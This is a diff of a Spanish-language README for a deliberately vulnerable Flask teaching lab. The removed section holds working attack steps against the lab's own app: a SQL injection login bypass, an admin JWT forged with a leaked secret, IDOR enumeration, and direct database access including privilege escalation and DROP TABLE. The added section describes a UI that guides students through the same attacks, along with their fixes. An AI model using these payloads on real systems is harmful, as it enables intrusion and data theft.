@@ -1,241 +1,197 @@
-# 🔓 lab-insecure
+# lab-insecure
 
 **Laboratorio de vulnerabilidades deliberadas para clase magistral de ciberseguridad**
 
-> ⚠️ Este proyecto contiene VULNERABILIDADES INTENCIONALES.
-> Uso exclusivo académico. NO DESPLEGAR EN PRODUCCIÓN.
+> Uso exclusivo académico. No desplegar en producción.
 
 ---
 
-## Requisitos
+## Qué incluye
 
-- Docker Desktop (Windows/Mac) o Docker Engine (Linux)
-- `curl` o Postman
-- Opcional: `psql` para el ejercicio de puerto DB expuesto
+Una aplicación web completa con:
+
+- **UI visual** en el browser — los estudiantes interactúan como si fuera una app real
+- **API Flask** con 4 vulnerabilidades intencionales
+- **PostgreSQL** con datos de prueba
+
+| Ataque | Ruta vulnerable | Ruta corregida |
+|--------|----------------|----------------|
+| SQL Injection    | `POST /login`      | `POST /secure/login` |
+| Secretos expuestos | `GET /debug`     | No existe (se elimina) |
+| Forjar JWT       | `POST /api/forge`  | — |
+| IDOR             | `GET /user/:id`    | `GET /secure/user/:id` |
 
 ---
 
-## Levantar el laboratorio
+## Levantar el lab (tu servidor)
 
 ```bash
-# 1. Clonar o descomprimir el proyecto
 cd lab-insecure
-
-# 2. Levantar los contenedores
 docker compose up -d
-
-# 3. Verificar que todo corra
 docker compose ps
 
-# Deberías ver:
-# lab_db       running   0.0.0.0:5432->5432/tcp
-# lab_backend  running   0.0.0.0:5000->5000/tcp
-
-# 4. Verificar health
+# Verificar
 curl http://localhost:5000/health
+
+# La UI visual está en:
+# http://localhost:5000
 ```
 
 ---
 
-## Vulnerabilidades incluidas
+## Exponer con Cloudflare Tunnel
 
-| ID  | Endpoint        | Vulnerabilidad              | Impacto                          |
-|-----|-----------------|----------------------------|----------------------------------|
-| V1  | POST /login     | SQL Injection               | Bypass de autenticación          |
-| V2  | GET  /debug     | Secretos expuestos          | Robo de JWT_SECRET y credenciales|
-| V3  | GET  /user/:id  | IDOR (sin autorización)     | Acceso a datos de otros usuarios |
-| V4  | Base de datos   | Contraseñas en texto plano  | Dump = credenciales reales       |
-| V5  | JWT             | Secreto débil hardcodeado   | Forjar tokens de admin           |
-| V6  | CORS            | Access-Control-Allow-Origin:* | Peticiones desde cualquier dominio|
-| V7  | Errores         | Stack traces al cliente     | Exposición de rutas internas     |
+### Opción A — Agregar al tunnel existente
 
----
+Editá `/etc/cloudflared/config.yml`:
 
-## ATAQUE 01 — SQL Injection
-
-```bash
-# Login normal (falla con contraseña incorrecta)
-curl -s -X POST http://localhost:5000/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "wrong"}' | python3 -m json.tool
-
-# SQL Injection — entra SIN contraseña válida
-curl -s -X POST http://localhost:5000/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\''--", "password": "nada"}' | python3 -m json.tool
-
-# Resultado esperado: {"status": "ok", "token": "...", "user": {...}}
-# La query ejecutada fue:
-# SELECT ... WHERE username='admin'--' AND password='nada'
-#                              ↑
-#                         -- comenta el AND password
-```
-
-**Fix:** usar prepared statements — `cur.execute("... WHERE username=%s AND password=%s", (u,p))`
-
-Ver `/secure/login` para la versión corregida.
-
----
-
-## ATAQUE 02 — Secretos expuestos en /debug
-
-```bash
-# Ver todas las variables de entorno de la app
-curl -s http://localhost:5000/debug | python3 -m json.tool
-
-# Obtendrás entre otras cosas:
-# "JWT_SECRET": "mysecretkey"
-# "DB_PASS": "admin123"
-
-# Con el JWT_SECRET podés forjar un token de admin:
-python3 - << 'PYEOF'
-import jwt
-from datetime import datetime, timedelta
-
-secreto = "mysecretkey"   # obtenido del /debug
-token = jwt.encode(
-    {
-        "user_id": 1,
-        "username": "admin",
-        "role": "admin",
-        "exp": datetime.utcnow() + timedelta(days=30)
-    },
-    secreto,
-    algorithm="HS256"
-)
-print("Token forjado de ADMIN:")
-print(token)
-PYEOF
-```
-
-**Fix:** eliminar /debug en producción. Usar AWS Secrets Manager o .env fuera del repo.
-
----
-
-## ATAQUE 03 — IDOR (acceder a datos de otros usuarios)
-
-```bash
-# 1. Login como carlos (usuario normal)
-TOKEN=$(curl -s -X POST http://localhost:5000/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "carlos", "password": "pass456"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
-
-echo "Token de carlos: $TOKEN"
-
-# 2. Con token de carlos, acceder a datos de ADMIN (user_id=1)
-curl -s http://localhost:5000/user/1 \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
-
-# 3. Enumerar todos los usuarios
-curl -s http://localhost:5000/user/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
-curl -s http://localhost:5000/user/3 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
-curl -s http://localhost:5000/user/4 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
-```
-
-**Fix:** validar que `token['user_id'] == user_id` o que `token['role'] == 'admin'`.
-
-Ver `/secure/user/<id>` para la versión corregida.
-
----
-
-## ATAQUE 04 — Puerto de BD expuesto al exterior
-
-```bash
-# Conectarse DIRECTAMENTE a la BD, bypasseando toda la aplicación
-# (requiere psql instalado en la máquina host)
-psql -h localhost -U admin -d labdb
-# Password: admin123
-
-# Dentro de psql:
-\dt                          -- listar tablas
-SELECT * FROM users;         -- ver TODOS los usuarios con contraseñas
-UPDATE users SET role='admin' WHERE username='carlos';   -- escalar privilegios
-DROP TABLE products;         -- destrucción de datos
-\q
-```
-
-**Fix en docker-compose.yml:**
 ```yaml
-db:
-  # Eliminar "ports:" y usar "expose:" para acceso solo interno
-  expose:
-    - "5432"
-  # NO usar: ports: ["5432:5432"]
+ingress:
+  # tus servicios existentes...
+  - hostname: lab.servelejo.site
+    service: http://localhost:5000
+  - service: http_status:404
 ```
-
----
-
-## Verificar las versiones seguras
 
 ```bash
-# Login seguro (prepared statements)
-curl -s -X POST http://localhost:5000/secure/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\''--", "password": "nada"}' | python3 -m json.tool
-# Resultado esperado: {"error": "Credenciales incorrectas"} — NO hay injection
-
-# Usuario seguro (con validación de autorización)
-TOKEN=$(curl -s -X POST http://localhost:5000/secure/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "carlos", "password": "pass456"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
-
-curl -s http://localhost:5000/secure/user/1 \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
-# Resultado esperado: {"error": "Acceso denegado"} — el 403 funciona
+sudo systemctl restart cloudflared
+# Probar desde celular con datos (red diferente):
+curl https://lab.servelejo.site/health
 ```
 
----
-
-## Comandos de utilidad
+### Opción B — Tunnel nuevo
 
 ```bash
-# Ver logs en tiempo real
-docker compose logs -f backend
+cloudflared tunnel create lab-clase
+cloudflared tunnel route dns lab-clase lab.servelejo.site
 
-# Ver logs de la BD
-docker compose logs db
+cat > /etc/cloudflared/lab.yml << EOF
+tunnel: TU-TUNNEL-ID
+credentials-file: /root/.cloudflared/TU-TUNNEL-ID.json
+ingress:
+  - hostname: lab.servelejo.site
+    service: http://localhost:5000
+  - service: http_status:404
+EOF
 
-# Reiniciar solo el backend (útil si se modifica app.py)
-docker compose restart backend
-
-# Entrar al contenedor del backend
-docker exec -it lab_backend bash
-
-# Entrar al contenedor de la BD
-docker exec -it lab_db psql -U admin -d labdb
-
-# Detener todo
-docker compose down
-
-# Detener y eliminar volúmenes (reset completo)
-docker compose down -v
+cloudflared service install --config /etc/cloudflared/lab.yml
+sudo systemctl start cloudflared-lab
 ```
 
 ---
 
-## Estructura del proyecto
+## Scripts de arranque / apagado
+
+Guardá como `~/arrancar-lab.sh`:
+
+```bash
+#!/bin/bash
+cd ~/lab-insecure
+docker compose up -d
+sleep 8
+
+STATUS=$(curl -s http://localhost:5000/health | python3 -c \
+  "import sys,json; print(json.load(sys.stdin).get('status','error'))" 2>/dev/null)
+
+[ "$STATUS" = "ok" ] && echo "Backend OK" || { echo "Backend no responde"; docker compose logs backend; exit 1; }
+
+sudo systemctl start cloudflared
+sleep 3
+
+REMOTE=$(curl -s https://lab.servelejo.site/health | python3 -c \
+  "import sys,json; print(json.load(sys.stdin).get('status','error'))" 2>/dev/null)
+
+[ "$REMOTE" = "ok" ] \
+  && echo "Lab listo en: https://lab.servelejo.site" \
+  || echo "Tunnel tardando. Verificar en unos segundos."
+```
+
+```bash
+chmod +x ~/arrancar-lab.sh ~/apagar-lab.sh
+```
+
+`~/apagar-lab.sh`:
+
+```bash
+#!/bin/bash
+sudo systemctl stop cloudflared
+cd ~/lab-insecure && docker compose down
+echo "Lab apagado."
+```
+
+---
+
+## Lo que hacen los estudiantes
+
+Abrís el browser en `https://lab.servelejo.site` y ya.
+
+**No necesitan instalar Docker.** Solo `curl`, Python 3 y `pip install PyJWT requests`
+para los ejercicios de terminal complementarios.
+
+---
+
+## Flujo de la clase en la UI
+
+### Tab 01 — SQL Injection
+
+1. El estudiante intenta login con `admin` / `wrong_password` → ve el error 401
+2. Observa la query que se construye en tiempo real abajo del formulario
+3. Hace clic en **"Inyectar SQL"** → el campo se llena con `admin'--`
+4. Ve cómo la query cambia y la condición de password queda comentada
+5. El servidor retorna 200 y un token → impacto visual inmediato
+6. Copia el token para usarlo en Tab 03
+
+### Tab 02 — Secretos expuestos
+
+1. Hace clic en **"GET /debug"**
+2. Ve todas las variables de entorno — `DB_PASS`, `JWT_SECRET`, etc. resaltadas en rojo
+3. El secreto se carga automáticamente en el campo de forjado
+4. Hace clic en **"Forjar token de admin"** → obtiene un token de admin sin conocer la contraseña
+5. Copia el token
+
+### Tab 03 — IDOR
+
+1. Pega el token de carlos (obtenido con login normal en Tab 01)
+2. Pone `user_id = 1` (el admin)
+3. Hace clic en **"GET /user/:id"** → ve los datos del admin con el token de carlos
+4. Hace clic en **"Enumerar todos"** → lista completa de usuarios del sistema
+
+### Tab FIX — Versiones corregidas
+
+1. Intenta la misma inyección en `/secure/login` → recibe 401 correctamente
+2. Intenta IDOR con `/secure/user/1` usando token de carlos → recibe 403
+3. Hace login real con credenciales válidas → recibe token, accede a sus propios datos
+
+---
+
+## Troubleshooting
+
+| Problema | Causa | Solución |
+|----------|-------|----------|
+| UI no carga | Backend caído | `docker compose logs backend` |
+| 502 en tunnel | Puerto incorrecto | Verificar `docker compose ps` |
+| `/debug` sin JWT_SECRET | Variable no pasada | Revisar `docker-compose.yml` |
+| SQL Injection no funciona | BD no lista | Esperar 10s y reintentar |
+| Tunnel no responde | DNS no propagado | Esperar 2–5 min |
+
+---
+
+## Estructura
 
 ```
 lab-insecure/
-├── docker-compose.yml     ← Orquestación (con vulnerabilidades de config)
-├── README.md              ← Este archivo
+├── docker-compose.yml
+├── README.md
 ├── backend/
-│   ├── app.py             ← Flask con vulnerabilidades comentadas
-│   ├── Dockerfile         ← Imagen (corre como root, imagen completa)
-│   └── requirements.txt
+│   ├── app.py            ← Flask: rutas vulnerables + rutas seguras
+│   ├── Dockerfile
+│   ├── requirements.txt
+│   └── static/
+│       └── index.html    ← UI visual completa (vanilla JS, sin deps)
 └── db/
-    └── init.sql           ← Datos de prueba (contraseñas en texto plano)
+    └── init.sql          ← Datos de prueba
 ```
 
 ---
 
-## Recursos para profundizar
-
-- OWASP Top 10: https://owasp.org/Top10/
-- DVWA (más ejercicios): https://github.com/digininja/DVWA
-- TryHackMe: https://tryhackme.com
-- HackTheBox: https://hackthebox.com
-
----
-
-*Creado para clase magistral — Diplomado en Ciberseguridad*
+*Clase magistral — Diplomado en Ciberseguridad*
